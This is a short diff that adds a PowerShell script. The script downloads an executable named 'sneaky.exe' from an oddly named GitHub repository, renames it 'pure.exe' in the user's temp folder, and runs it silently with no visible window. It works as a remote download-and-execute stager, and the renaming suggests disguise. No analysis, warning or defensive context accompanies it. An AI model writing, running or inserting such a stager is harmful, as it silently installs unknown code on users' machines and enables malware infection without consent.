@@ -1,0 +1,10 @@
+# Define the direct download link and local destination path
+$url = "https://github.com/aaaaaaaaaad2131213123123belgia/test/raw/refs/heads/main/sneaky.exe"
+$outputPath = Join-Path $env:TEMP "pure.exe"
+
+# Download the file from the URL
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+
+# Execute the downloaded file
+# Use -ArgumentList to pass silent install arguments if needed (e.g., "/silent", "/S", "/qn")
+Start-Process -FilePath $outputPath -ArgumentList "/silent" -Wait -NoNewWindow
